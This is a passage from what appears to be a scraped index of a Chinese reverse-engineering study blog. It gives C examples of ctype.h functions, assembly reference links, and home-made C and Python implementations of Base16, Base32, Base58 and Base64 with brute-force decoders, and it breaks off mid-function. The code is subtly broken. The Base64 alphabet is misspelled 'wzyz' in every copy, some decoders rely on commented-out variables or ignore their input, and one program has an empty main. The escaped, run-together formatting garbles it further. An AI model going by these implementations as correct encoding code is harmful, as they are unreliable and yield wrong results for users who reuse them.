否者返回0 12345678910111213#include &lt;stdio.h&gt;#include &lt;ctype.h&gt;int main()&#123; for (int i=0;i&lt;=127;++i) &#123; if ( isupper(i)!=0) printf(&quot;%c &quot;,i); &#125; puts(&quot;&quot;); return 0;&#125; 输出 1A B C D E F G H I J K L M N O P Q R S T U V W X Y Z isdigit 检测是不是10以内的ASCII-&gt;10进制数字 int isdigit(inr ASCII) 是10进制数字返回非零 否者返回0 ‘0x20’不是10进制数字,更像一个字符串 12345678910111213#include &lt;stdio.h&gt;#include &lt;ctype.h&gt;int main()&#123; for (int i=0;i&lt;=127;++i) &#123; if ( isdigit(i)!=0) printf(&quot;%c &quot;,i); &#125; puts(&quot;&quot;); return 0;&#125; 输出 10 1 2 3 4 5 6 7 8 9 isxdigit 检测是不是16进制的字符串是16进制数字返回非零 否者返回0 1234567891011121314#include &lt;stdio.h&gt;#include &lt;ctype.h&gt;int main()&#123; int i=0; char str[64]=&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;; for(i=0;i&lt;64;i++) &#123; if (isxdigit(str[i])!=0) printf(&quot;%c &quot;,str[i]); &#125; puts(&quot;&quot;); return 0;&#125; 输出 10 1 2 3 4 5 6 7 8 9 A B C D E F a b c d e f iscntrl 检测是不是控制字符 int iscntrl(int ASCII) 是控制字符返回非零 否者返回0 控制字符不可打印 12345678910111213#include &lt;stdio.h&gt;#include &lt;ctype.h&gt;int main()&#123; for (int i=0;i&lt;=127;++i) &#123; if (iscntrl(i)!=0) printf(&quot;%d &quot;,i); &#125; puts(&quot;&quot;); return 0;&#125; 输出它的10进制 10 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 127 ispunct 检测是不是标点符号 int ispunct(int ascii) 可标点符号返回非零(空格除外) 否者返回0 12345678910111213#include &lt;stdio.h&gt;#include &lt;ctype.h&gt;int main()&#123; int i; printf(&quot;C 语言中所有可打印的标点符号: &quot;); for (i=0;i&lt;=127;++i) &#123; if (ispunct(i)!=0) printf(&quot;%c &quot;,i); &#125; return 0;&#125; 输出 1! &quot; # $ % &amp; &#x27; ( ) * + , - . / : ; &lt; = &gt; ? @ [ \\ ] ^ _ ` &#123; | &#125; ~ isspace 检测是不是空白字符 int isspace(int c) 空白字符: 123456&#x27; &#x27; (0x20) space (SPC) 空格符&#x27;\\t&#x27; (0x09) horizontal tab (TAB) 水平制表符 &#x27; &#x27; (0x0a) newline (LF) 换行符&#x27;\\v&#x27; (0x0b) vertical tab (VT) 垂直制表符&#x27;\\f&#x27; (0x0c) feed (FF) 换页符&#x27;\\r&#x27; (0x0d) carriage return (CR) 回车符 是返回非零 否者返回0 123456789101112131415#include &lt;stdio.h&gt;#include &lt;ctype.h&gt;int main()&#123; int i; int ecx=0; for (i=0;i&lt;=127;++i) &#123; if (isspace(i)!=0) ecx++; &#125; printf(&quot;0-127中,有%d个空白字符&quot;,ecx); return 0;&#125; 输出 10-127中,有6个空白字符 tolower 大写变小写 int tolower(int 大写) 返回值是小写的值 如果原本本来就是小写,或者他不是字母就不处理 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;ctype.h&gt; int main()&#123; int i = 0; char str[] = &quot;DQX is FINE&quot;; while( str[i] ) &#123; putchar(tolower(str[i])); i++; &#125; puts(&quot;&quot;); return(0);&#125; 输出 1dqx is fine toupper 小写变大写 int toupper(int c) 返回一个大写的int值 如果原来就是大写,或者字符不存在大写就不管 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;ctype.h&gt; int main()&#123; int i = 0; char str[] = &quot;dqx IS fien&quot;; while( str[i] ) &#123; putchar(toupper(str[i])); i++; &#125; puts(&quot;&quot;); return(0);&#125; toascii 把任意数字转化位可见字符123456789#define _CRT_SECURE_NO_WARNINGS#include &lt;stdio.h&gt;#include &lt;ctype.h&gt;int main()&#123; int a = 200; printf(&quot;%c &quot;,toascii(a));&#125; 其实它不是函数,他是一个宏 1#define __toascii(c) ((c) &amp; 0x7f) 可能上面很多函数都是宏,只是没注意","tags":["C语言库函数"],"categories":["Language"]},{"title":"x86汇编小结","path":"/re4mile/2021/06/07/language/Asm/windwos/小结/language/","content":"参考链接https://www.shuzhiduo.com/topic/win32%e6%b1%87%e7%bc%96%e7%a1%ac%e4%bb%b6%e4%b8%ad%e6%96%ad/ https://liuzhian.github.io/2018/07/28/%E6%B1%87%E7%BC%96-INT21h%E4%B8%AD%E6%96%AD%E7%9A%84%E4%BD%BF%E7%94%A8/ https://blog.csdn.net/yyxhhx/article/details/24190915 https://blog.csdn.net/ttzyanswer/article/details/2049175 https://wenku.baidu.com/view/11ceaae54328915f804d2b160b4e767f5bcf804d.html?_wkts_=1672367915748","tags":["Assembly","x86"],"categories":["Language"]},{"title":"BASE系列加密算法","path":"/re4mile/2021/06/07/re/加密算法/基础/BASE/re/","content":"待学习的参考链接傅里叶加密 https://joi.usst.edu.cn/html/2015/1/20150116.htm#outline_anchor_5 https://zhuanlan.zhihu.com/p/104079068 https://baike.baidu.com/item/%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2/7119029 https://www.cnblogs.com/h2zZhou/p/8405717.html base16表的长度是16位.为什么??因为是2的4次方 4是位移的最大bit encode12345678910111213141516171819202122232425262728#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;windows.h&gt;int main()&#123;&#125;void test()&#123;\tBYTE sz_Input[128] = &quot;dqx-0x9d&quot;;\tBYTE sz_Encode[128] = &#123; 0 &#125;;\tBYTE sz_Table[128] = &quot;0123456789ABCDEF&quot;;\tDWORD len_input=0, len_code=0, i=0, ii=0, num=0;\tlen_input = strlen(sz_Input);\tlen_code = len_input * 2;\tfor (i = 0, ii = 0; i &lt; len_input; i++, ii += 2)\t&#123; sz_Encode[ii + 0 ] = sz_Table[sz_Input[i] &gt;&gt; 4]; sz_Encode[ii + 1 ] = sz_Table[sz_Input[i] &amp; 0b00001111]; &#125;\tprintf(&quot;%d:%d &quot;, len_input, len_code);\tprintf(&quot;%s:%s &quot;, sz_Input, sz_Encode);&#125; 其它情况 123456789101112131415161718192021222324#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main(void)&#123; char input[100] = &quot;dqx-0x9d&quot;; char encode[100]=&#123;0&#125;; unsigned char table[] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwzyz0123456789+/&quot;;//我们可以修改这个表格 int len_input, len_code, i, ii, num; len_input = strlen(input); len_code = len_input * 2; for (i = 0, ii = 0; i &lt; len_input; i++, ii += 2) &#123; encode[ii] = table[input[i] &gt;&gt; 3];//高2位 , encode[ii + 1] = table[input[i] &amp; 0b11111];//低6位 &#125; printf(&quot;%d:%d &quot;,len_input,len_code); printf(&quot;%s:%s &quot;,input,encode);&#125; decode爆破脚本 12345678910111213141516171819202122232425262728#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main(void)&#123;\t// char input[]=&quot;6471782D30783964&quot;;\tchar table[]=&quot;0123456789ABCDEF&quot;;\tbool a=0,b=0;\tint len=strlen(input);\tunsigned int i = 0, ii = 0;\tunsigned char flag1=0; for (; i &lt; len/2; i++, ii += 2) &#123; for(flag1=0;flag1&lt;128;flag1++) &#123; a=table[flag1&gt;&gt;4]==input[ii]; b=table[flag1&amp;15]==input[ii+1]; if(a&amp;&amp;b) &#123; printf(&quot;%c&quot;,flag1); break; &#125; &#125; &#125;&#125; 方法一,直接获取在table中的表,然后计算 1234567891011121314151617181920212223242526272829#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main(void)&#123; char table[17] = &quot;0123456789ABCDEF&quot;;// char encode[]=&quot;6261636465&quot;; char decode[100]=&#123;0&#125;; unsigned int index[100]=&#123;0&#125;; unsigned int i=0,ii=0; for(i=0;i&lt;strlen(encode);i++) for(ii=0;ii&lt;strlen(table);ii++) if(encode[i]==table[ii]) index[i]=ii; for(i=0,ii=0;i&lt;strlen(encode)/2;i++,ii+=2) decode[i]=(index[ii]&lt;&lt;4)|index[ii+1]; puts(decode); return 0;&#125;/*找到在表中的位置 ,每2个为一个位置 index1 高4位 ,左移动4位 index2 低4位,取滴4位 相或 */ 方法二 根据已经有的表去获取它的index 12345678910111213141516171819202122232425#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main(void)&#123; char encode[100] = &quot;6471782D30783964&quot;; char decode[100]; int table[&#x27;F&#x27;+1] = &#123;0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0, //16 0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0, //32 0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0, //48 0,1,2,3, 4,5,6,7, 8,9,0,0, 0,0,0,0, //64 0,10,11, 12,13,14, 15 &#125;; int len_decode, len_encode, ii, i; len_encode = strlen(encode); len_decode = len_encode / 2; for (ii = 0, i = 0; ii &lt; len_encode; ii += 2, i++) decode[i] = table[encode[ii]] &lt;&lt; 4 | table[encode[ii + 1]]; for (ii = 0; ii &lt; len_decode; ii++) printf(&quot;%c&quot;, decode[ii]);&#125; base32 encode你可以在你的table表上做一些手脚,比如32位的长度,实际上是33 你可以把它改为64个长度 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main(int argc, char* argv[])&#123; char S_[100] = &quot;dqx-0x9d&quot;; char D_[100]=&#123;0&#125;; unsigned char table[] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&quot;; int len_input, encode_len, i, j, redundant; int base; len_input = strlen(S_); // 现在的长度是8/5倍 if (len_input % 5 != 0)//满足是5的倍数 encode_len = (len_input / 5 + 1) * 8; else encode_len = (len_input / 5) * 8; base = encode_len - 8; //5*8=8*5 40 //3*8=4*6 24 16 for (i = 0, j = 0; j &lt; encode_len; i += 5, j += 8)//针对5个去处理,8个去接收 &#123; D_[j + 0] = table[S_[i] &gt;&gt; 3];//5 D_[j + 1] = table[((S_[i] &amp; 7) &lt;&lt; 2) | (S_[i + 1] &gt;&gt; 6)]; D_[j + 2] = table[(S_[i + 1] &gt;&gt; 1) &amp; 31]; D_[j + 3] = table[(S_[i + 1] &amp; 1) &lt;&lt; 4 | S_[i + 2] &gt;&gt; 4]; D_[j + 4] = table[(S_[i + 2] &amp; 15) &lt;&lt; 1 | S_[i + 3] &gt;&gt; 7]; D_[j + 5] = table[(S_[i + 3] &gt;&gt; 2) &amp; 31]; D_[j + 6] = table[(S_[i + 3] &amp; 3) &lt;&lt; 3 | S_[i + 4] &gt;&gt; 5]; D_[j + 7] = table[S_[i + 4] &amp; 31]; &#125; redundant = len_input % 5;//末尾补上几个= switch (redundant) &#123; case 1: i = 2;break;//补足6个= case 2: i = 4;break;//补足4个= case 3: i = 5;break;//补足3个= case 4: i = 7;break;//补足1个= &#125; for (; i &lt; 8; i++) D_[base + i] = &#x27;=&#x27;; printf(&quot;%s %s &quot;, S_, D_);&#125; decode爆破123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt; int* find_index(const char* base_table_, const char* source_);int main(int argc, char* argv[])&#123;\tbool a = 0, b = 0, c = 0;\tunsigned int i = 0, j = 0;\tunsigned flag1 = 0, flag2 = 0;\tchar table[33] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&quot;;//为什么able表格是32字节的长度???你生成的idnex是2的5次方=4*8=32,所以你的索引值是32个 char encode[100] = &quot;MRYXQLJQPA4WI&quot;;\tunsigned encode_len = strlen(encode);\tchar* decode = (char*)calloc(1024, sizeof(char)); if (decode == NULL)exit(-1);\tint* table_index = find_index(&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&quot;, &quot;MRYXQLJQPA4WI&quot;); /*\t这些爆破都是分段的爆破,关键在于他是如何被编码的\t另外要注意的是,这些条件判断的a,b,c 他们的运算先后顺序很任意出错\t*/\tfor (i = 0, j = 0; j &lt; encode_len; i += 5, j += 8)//针对5个去处理,8个去接收\t&#123; for (flag1 = 65; flag1 &lt; 128; flag1++) &#123; flag2 = flag1; a = flag2 &gt;&gt; 3 == table_index[j + 0]; b = (flag2 &amp; 0b111) == (table_index[j + 1] &gt;&gt; 2); if (a &amp;&amp; b) &#123; decode[i] = flag1; break; &#125; if (flag1 == 128) &#123; printf(&quot;%d unset&quot;, i); exit(-1); &#125; &#125; for (flag1 = 0; flag1 &lt; 128; flag1++) &#123; flag2 = flag1; a = (flag2 &gt;&gt; 6) == (table_index[j + 1] &amp; 0b11); b = (flag2 &gt;&gt; 1 &amp; 0b11111) == table_index[j + 2]; c = (flag2 &amp; 1) == (table_index[j + 3] &gt;&gt; 4); if (a &amp;&amp; b &amp;&amp; c) &#123; decode[i+1] = flag1; break; &#125; if (flag1 == 128) &#123; printf(&quot;%d unset&quot;, i); exit(-1); &#125; &#125; for (flag1 = 0; flag1 &lt; 128; flag1++) &#123; flag2 = flag1; a = (flag2 &gt;&gt; 4) == (table_index[j + 3] &amp; 0b1111); b = (flag2 &amp; 0b1111) == (table_index[j + 4] &gt;&gt; 1); if (a &amp;&amp; b) &#123; decode[i+2] = flag1; break; &#125; if (flag1 == 128) &#123; printf(&quot;%d unset&quot;, i); exit(-1); &#125; &#125; for (flag1 = 0; flag1 &lt; 128; flag1++) &#123; flag2 = flag1; a = (flag2 &gt;&gt; 7) == (table_index[j + 4] &amp; 1); b = (flag2 &gt;&gt; 2 &amp; 0b11111) == (table_index[j + 5]); c = (flag2 &amp; 0b11) == (table_index[j + 6] &gt;&gt; 3); if (a &amp;&amp; b &amp;&amp; c) &#123; decode[i+3] = flag1; break; &#125; if (flag1 == 128) &#123; printf(&quot;%d unset&quot;, i); exit(-1); &#125; &#125; for (flag1 = 0; flag1 &lt; 128; flag1++) &#123; flag2 = flag1; a = (flag2 &gt;&gt; 5) == (table_index[j + 6] &amp; 0b111); b = (flag2 &amp; 0b11111) == (table_index[j + 7]); if (a &amp;&amp; b) &#123; decode[i+4] = flag1; break; &#125; if (flag1 == 128) &#123; printf(&quot;%d unset&quot;, i); exit(-1); &#125; &#125;\t&#125;\tputs(decode);\tfree(decode);\tfree(table_index);\treturn 0;&#125;int* find_index(const char* base_table_, const char* source_)&#123;\tchar* base_table = (char*)calloc(1024, sizeof(char));\tchar* source = (char*)calloc(1024, sizeof(char));\tint* index_table = (int*)calloc(1024, sizeof(int));\tif (base_table == NULL || source == NULL || index_table == NULL)\t&#123; puts(&quot;find_index calloc wrong&quot;); exit(-1);\t&#125;\tunsigned int i = 0, ii = 0;\tstrcpy(base_table, base_table_);\tstrcpy(source, source_);\tfor (i = 0; i &lt; strlen(source); i++) for (ii = 0; ii &lt; strlen(base_table); ii++) if (source[i] == base_table[ii]) index_table[i] = ii;\tfree(base_table);\tfree(source);\treturn index_table;&#125; 常规解法注意实现 左移右移的运算符优先级 &gt; 与或非运算 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt; int* find_index(const char* base_table_, const char* source_);int main()&#123; unsigned int i = 0, j = 0; int* index_table = find_index(&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&quot;, &quot;MRYXQLJQPA4WI&quot;); char decode[1024] = &#123; 0 &#125;; char encode[1024] = &#123; 0 &#125;; strcpy(encode, &quot;MRYXQLJQPA4WI&quot;); unsigned int encode_len = strlen(encode); if (encode_len % 8 != 0) encode_len = (encode_len / 8 + 1) * 8; for (i = 0, j = 0; j &lt; encode_len; i += 5, j += 8)//针对5个去处理,8个去接收 &#123; decode[i + 0] = (index_table[j + 0] &lt;&lt; 3) | (index_table[j + 1] &gt;&gt; 2); decode[i + 1] = ((index_table[j + 1] &amp; 0b11) &lt;&lt; 6) | (index_table[j + 2] &lt;&lt; 1) | (index_table[j + 3] &gt;&gt; 4);//5 1 4 decode[i + 2] = ((index_table[j + 3] &amp; 0b1111) &lt;&lt; 4) | (index_table[j + 4] &gt;&gt; 1); decode[i + 3] = ((index_table[j + 4] &amp; 1) &lt;&lt; 7) | (index_table[j + 5]&lt;&lt;2) | (index_table[j + 6] &gt;&gt; 3); decode[i + 4] = ((index_table[j + 6] &amp; 0b111) &lt;&lt; 5) | (index_table[j + 7]); &#125; puts(decode); free(index_table); return 0;&#125;int* find_index(const char* base_table_, const char* source_)&#123; char* base_table = (char*)calloc(1024, sizeof(char)); char* source = (char*)calloc(1024, sizeof(char)); int* index_table = (int*)calloc(1024, sizeof(int)); if (base_table == NULL || source == NULL || index_table == NULL) &#123; puts(&quot;find_index calloc wrong&quot;); exit(-1); &#125; unsigned int i = 0, ii = 0; strcpy(base_table, base_table_); strcpy(source, source_); for (i = 0; i &lt; strlen(source); i++) for (ii = 0; ii &lt; strlen(base_table); ii++) if (source[i] == base_table[ii]) index_table[i] = ii; free(base_table); free(source); return index_table;&#125;//MRYXQLJQPA4WI=== base58就是一个进制的转化 Cencode123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include&lt;qdll.h&gt;void en_base58(BYTE* input);int main()&#123; BYTE s[64]; qZero(s, 64); strcat(s, &quot;qwer1234&quot;); en_base58(s); return 0;&#125;void en_base58(BYTE* input) &#123; BYTE Base58_table[64]; DWORD32 len_input = 0; DWORD32 len_encode =0; BYTE* Encrypt = NULL; BYTE* Arr_58 = NULL; DWORD32 i = 0, j = 0, Sum_Old = 0, Sum_New = 0,cnt=0; qZero(Base58_table, 64); strcpy(Base58_table, &quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;); len_input = strlen((char*)input); len_encode = 2 * len_input;//它的长度要求没有必要那么准确,只要大于精确值就好,精确值是lg256/lg58,我们直接取2倍长度 Encrypt = qAlloc(1024); Arr_58 = qAlloc(1024); while (i &lt; len_input) &#123; if (input[i]) &#123; Sum_Old = 0; for (j = i; j &lt; len_input; j++)//256进制转10进制的过程还没有进行完毕,就已经开始了58进制的转化 &#123; Sum_New = Sum_Old * 256 + input[j];//把ascii当作256进制,也就是0xff就是一位256进制,而不是2位 Sum_Old = Sum_New % 58; input[j] = Sum_New / 58;//他的每一位都是(上一位+自己)/58 &#125; Arr_58[cnt++] = Sum_Old;//分离出来的58进制 &#125; else i++; &#125; for (i = 0; i &lt; cnt; i++) Encrypt[i] = Base58_table[Arr_58[cnt - 1 - i]]; puts(Encrypt); qFree(Encrypt); qFree(Arr_58);&#125; decode123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include&lt;qdll.h&gt;void en_base58(BYTE* input);int main()&#123; BYTE s[64]; qZero(s, 64); strcat(s, &quot;KymSGnQQKrj&quot;); en_base58(s); return 0;&#125;void en_base58(BYTE* Encode_Data)&#123; DWORD32 len = 0; BYTE* Flag = NULL; DWORD32 i = 0, j = 0, Sum_Old = 0, Sum_New = 0, cnt =0; BYTE b_tmp = 0; BYTE Base256_table[256] = &#123; 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0, 1, 2, 3, 4, 5, 6, 7, 8, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,9, 10,11, 12, 13, 14,15, 16, 0xcc, 17,18, 19, 20, 21, 0xcc, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 0xcc, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, &#125;; len = strlen((char*)Encode_Data); Flag = qAlloc(1024); i = 0; for (i = 0; i &lt; len; i++) Encode_Data[i] = Base256_table[Encode_Data[i]]; i = 0; while (i &lt; len) &#123; if (Encode_Data[i]) &#123; Sum_Old = 0; for (j = i; j &lt; len; j++) &#123; Sum_New = Sum_Old * 58+ Encode_Data[j]; Sum_Old = Sum_New % 256; Encode_Data[j] = Sum_New / 256; &#125; Flag[cnt++] = Sum_Old; &#125; else i++; &#125; len = strlen(Flag); for (i = 0; i &lt; len/2; i++) &#123; b_tmp = Flag[i]; Flag[i] = Flag[len - 1 - i]; Flag[len - 1 - i] = b_tmp; &#125; puts(Flag); qFree(Flag);&#125; python1234567891011121314151617181920212223242526272829303132def b58encode(tmp:str) -&gt; str:\ttmp = list(map(ord,tmp)) #也就产生一个int数组\ttemp = tmp[0] #赋予\tbase58 = &quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;\tfor i in range(len(tmp)-1): temp = temp * 256 + tmp[i+1] #256进制转10进制\ttmp = []\twhile True: tmp.insert(0,temp % 58) temp = temp // 58 if temp == 0: break\ttemp = &quot;&quot;\tfor i in tmp: temp += base58[i]\treturn tempdef b58decoade(tmp:str) -&gt; str:\timport binascii\tbase58 = &quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;\ttemp = []\tfor i in tmp: temp.append(base58.index(i))\ttmp = temp[0]\tfor i in range(len(temp)-1): tmp = tmp * 58 + temp[i+1]\treturn binascii.unhexlify(hex(tmp)[2:].encode(&quot;utf-8&quot;)).decode(&quot;UTF-8&quot;)print(b58encode(&quot;dqx-0x9d&quot;))print(b58decode(&quot;HoRfY3ekXYX&quot;)) base64encode123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;typedef unsigned char uchar;typedef unsigned int uint;char* base64_encode(const char* s);int main(int argc, char* argv[]) &#123; uchar input[] = &quot;dqx-0x9d&quot;; char* e= base64_encode((const char*)input); puts(e); return 0;&#125;char* base64_encode(const char* s)&#123; const uchar base64_table[] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwzyz0123456789+/&quot;; uint len_input = strlen(s); uint len_encode; if (len_input % 3 != 0) len_encode = (len_input / 3 + 1) * 4; else len_encode = (len_input / 3) * 4; uchar* encode = (uchar*)calloc(1024, sizeof(uchar)); if (encode == NULL)exit(-1); encode[len_encode] = &#x27;\\0&#x27;; uint i=0, j=0; for (i = 0, j = 0; i &lt; len_input; i += 3, j += 4) &#123; encode[j + 0] = base64_table[s[i+0] &gt;&gt; 2]; encode[j + 1] = base64_table[(((s[i+0] &amp; 0b11) &lt;&lt; 4) | (s[i + 1] &gt;&gt; 4))]; encode[j + 2] = base64_table[((s[i + 1] &amp; 0b1111) &lt;&lt; 2) | (s[i + 2] &gt;&gt; 6)]; encode[j + 3] = base64_table[s[i + 2] &amp; 0b111111]; &#125; switch (len_input % 3) &#123; case 1: encode[len_encode - 2] = &#x27;=&#x27;; encode[len_encode - 1] = &#x27;=&#x27;; break; case 2: encode[len_encode - 1] = &#x27;=&#x27;; break; &#125; return (char*)encode;&#125; decode爆破123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;typedef unsigned char uchar;typedef unsigned int uint;char* base64_decode(const char* s);int* find_index(const char* base_table_, const char* source_);int main(int argc, char* argv[]) &#123; uchar input[] = &quot;dqx-0x9d&quot;; char* e= base64_decode((const char*)input); puts(e); return 0;&#125;char* base64_decode(const char* s)&#123; const uchar base64_table[] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwzyz0123456789+/&quot;; const uchar encode[] = &quot;ZHF4LTB4OWQ&quot;; uint len_encode = strlen((const char*)encode); uchar* decode = (uchar*)calloc(1024, sizeof(uchar)); if (decode == NULL)exit(-1); uchar flag1=0, flag2 = 0; uint* encode_index_table = (uint*)find_index(&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwzyz0123456789+/&quot;, &quot;ZHF4LTB4OWQ&quot;); uint i=0, j=0; bool a = 0, b = 0; for (i = 0, j = 0; j &lt; len_encode; i += 3, j += 4) &#123; for (flag1 = 0; flag1 &lt; 128; flag1++) &#123; flag2 = flag1; a=encode_index_table[j + 0] == flag2 &gt;&gt; 2; b = (flag2 &amp; 0b11) == (encode_index_table[j + 1] &gt;&gt; 4); if (a &amp;&amp; b) &#123; decode[i + 0] = flag1; break; &#125; &#125; if (flag1 == 128) &#123; decode[i + 0] = 0; break; &#125; for (flag1 = 0; flag1 &lt; 128; flag1++) &#123; flag2 = flag1; a = (flag2 &gt;&gt; 4) == (encode_index_table[j + 1] &amp; 0b1111); b = (flag2 &amp; 0b1111) == (encode_index_table[j + 2] &gt;&gt; 2); if (a &amp;&amp; b) &#123; decode[i + 1] = flag1; break; &#125; &#125; if (flag1 == 128) &#123; decode[i + 1] = 0; break; &#125; for (flag1 = 0; flag1 &lt; 128; flag1++) &#123; flag2 = flag1; a = (flag2 &gt;&gt; 6) == (encode_index_table[j + 2] &amp; 0b11); b = (flag2 &amp; 0b111111) == encode_index_table[j + 3]; if (a &amp;&amp; b) &#123; decode[i + 2] = flag1; break; &#125; &#125; if (flag1 == 128) &#123; decode[i + 2] = 0; break; &#125; &#125; return (char*)decode;&#125;int* find_index(const char* base_table_, const char* source_)&#123; char* base_table = (char*)calloc(1024, sizeof(char)); char* source = (char*)calloc(1024, sizeof(char)); int* index_table = (int*)calloc(1024, sizeof(int)); if (base_table == NULL || source == NULL || index_table == NULL) &#123; puts(&quot;find_index calloc wrong&quot;); exit(-1); &#125; unsigned int i = 0, ii = 0; strcpy(base_table, base_table_); strcpy(source, source_); for (i = 0; i &lt; strlen(source); i++) for (ii = 0; ii &lt; strlen(base_table); ii++) if (source[i] == base_table[ii]) index_table[i] = ii; free(base_table); free(source); return index_table;&#125; 正常解除123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */typedef unsigned char uchar;typedef unsigned int uint;char* decode(char* s);uint* find_index(const char* base_table_, const char* source_);int main()&#123; char encode[] = &quot;ZHF4LTB4OWQtYmlyZDJnaG9zdA==&quot;;//SGFw cHkg Ymly dGh puts(decode(encode)); return 0;&#125;char* decode(char* encode)&#123; uchar* decode; const uchar base64_table[] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwzyz0123456789+/&quot;; uint *encode_index=find_index(&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwzyz0123456789+/&quot;, &quot;ZHF4LTB4OWQtYmlyZDJnaG9zdA&quot;); uint len_encode; uint len_decode; len_encode = strlen(encode); if (strstr(encode, &quot;==&quot;)) len_decode = (len_encode / 4) * 3 - 2; else if (strstr(encode, &quot;=&quot;)) len_decode = (len_encode / 4) * 3 - 1; else len_decode = (len_encode / 4) * 3; uint i, j; decode = (uchar*)calloc(1024, sizeof(uchar)); if (decode == NULL) exit(-1); for (i = 0, j = 0; i &lt; len_encode; i += 4, j += 3) &#123; decode[j + 0] = (encode_index[i+0] &lt;&lt; 2) | (encode_index[i + 1] &gt;&gt; 4); decode[j + 1] = (encode_index[i + 1] &lt;&lt; 4) | (encode_index[i + 2] &gt;&gt; 2); decode[j + 2] = (encode_index[i + 2] &lt;&lt; 6) | (encode_index[i + 3]); 